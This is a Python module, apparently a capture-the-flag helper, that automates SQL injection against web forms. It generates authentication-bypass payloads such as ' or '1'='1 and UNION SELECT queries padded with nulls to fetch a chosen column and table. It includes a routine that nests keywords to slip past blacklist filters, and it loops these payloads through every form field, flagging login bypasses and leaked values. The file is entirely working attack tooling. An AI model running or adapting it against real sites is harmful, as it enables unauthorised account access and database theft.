import itertools, time, typing

import utils

'''
Gives information about a vulnerable form field
'''
class SQLIVuln():
    def __init__(self, query: str, qtype:str, form: str, field: str) -> None:
        self._query = query
        self._qtype = qtype
        self._form = form
        self._field = field
    
    def __repr__(self) -> str:
        return f'\x1B[91mVulnerability detected!\x1B[0m\nOn field {self._field} in {self._form}\nQuery was {self._query}, type {self._qtype}'

'''
Avoids a blacklist by adding substrings for query words
'''
def bl_avoid_substring(query: str) -> str:
    blacklist = ['select', 'from', 'where', 'union', 'insert', 'update']
    for word in blacklist:
        query = query.replace(word, word[0] + word + word[1:])
    return query

'''
Generates login-type queries with true or false statements injected
'''
def login_queries(limits: int) -> typing.List[str]:
    candidates = []

    types = ['\' or \'1\'=\'1', '\' or \'1\'=\'1\';--', '\' or \'1\'=\'1\' and \'1\'=\'1', '\' union select 1@@;--', '\' union select \'a\'@@;--']

    for settings in itertools.product(types, range(limits)):
        candidates.append(settings[0].replace('@@', ', null' * settings[1]))
        candidates.append(bl_avoid_substring(candidates[-1]))

    return candidates

'''
Generates flag-type queries which attempt to fetch a specific database field
'''
def flag_queries(limits: int, flag_col: str, flag_table: str) -> typing.List[str]:
    candidates = []

    types = ['\' union select ' + flag_col + '@@ from ' + flag_table + ';--']

    for settings in itertools.product(types, range(limits)):
        candidates.append(settings[0].replace('@@', ', null' * settings[1]))
        candidates.append(bl_avoid_substring(candidates[-1]))

    return candidates

'''
Tests a list of forms for login vulernabilities, given the name of a login cookie
'''
def test_login(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int], cookie: str) -> typing.List[SQLIVuln]:
    results = []
    queries = login_queries(limits)

    for form in targets:
        for field in form.get_fields():
            for query in queries:
                _, err, cookie_value = form.request({x : (query if x == field else '') for x in form.get_fields()}, cookie)

                if err is None and cookie_value is not None:
                    results.append(SQLIVuln(query, 'login', form, field))

                if delay is not None:
                    time.sleep(delay)
    
    return results

'''
Tests a list of forms for flag vulnerabilities, given a flag column and flag table
'''
def test_flag(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int], flag_col: str, flag_table: str, flag_val: str) -> typing.List[SQLIVuln]:
    results = []
    queries = flag_queries(limits, flag_col, flag_table)

    for form in targets:
        for field in form.get_fields():
            for query in queries:
                response, err, _ = form.request({x : (query if x == field else '') for x in form.get_fields()}, None)

                if err is None and flag_val in response.text:
                    results.append(SQLIVuln(query, 'flag', form, field))
                    
                if delay is not None:
                    time.sleep(delay)
    
    return results